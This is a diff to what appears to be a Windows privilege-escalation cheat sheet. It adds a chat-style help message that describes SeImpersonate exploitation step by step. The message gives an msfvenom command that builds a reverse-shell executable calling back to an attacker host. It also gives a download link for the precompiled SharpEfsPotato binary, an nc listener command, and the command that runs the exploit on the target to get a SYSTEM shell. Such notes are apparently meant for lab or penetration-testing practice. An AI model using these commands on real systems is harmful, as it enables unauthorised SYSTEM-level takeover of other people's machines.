@@ -69,6 +69,29 @@ Microsoft Windows [Version 10.0.10586]
 | 5    | RoguePotato   | More environmental dependencies, particularly its OXID resolver setup                                  |
 
 ---
+
+<@310848654975959040> - Here are some things I can suggest you try:
+- First off, could you try the `GodPotato` methodology mentioned in this message? https://discord.com/channels/780824470113615893/1087927333731713094/1547141759438553109
+(Make sure you're using a 64-bit version of `nc`, which is `nc64.exe`)
+- If you're still having problems exploiting the `SeImpersonate` privilege, then you can try my personal methodology. (Providing my methodology below)
+
+---
+## **SharpEfsPotato
+
+My methodology for SeImpersonate exploitation:**
+Personally, I always use `SharpEfsPotato` and run a reverse shell executable (generated from `msfvenom`) through it.
+As a result, you will have a stable shell with SYSTEM user context.
+
+This tool has never failed once on my side and is very reliable. You can look at the steps below regarding how to use it:
+1. Generate `shell.exe` with this command:
+```msfvenom -p windows/x64/shell_reverse_tcp LPORT=<PORT> LHOST=<IP> -f exe -o shell.exe```
+2. Download SharpEfsPotato from here: https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrivilegeEscalation/Token/SharpEfsPotato.exe
+- Transfer `shell.exe` and `SharpEfsPotato.exe` to your TARGET.
+- Start listener on KALI: `rlwrap -r nc -nlvp <PORT>`
+- Execute this on TARGET:
+```./SharpEfsPotato.exe -p shell.exe```
+
+Let me know how it goes 😉
 ## GodPotato.exe
 
 Find out highest .NET version installed
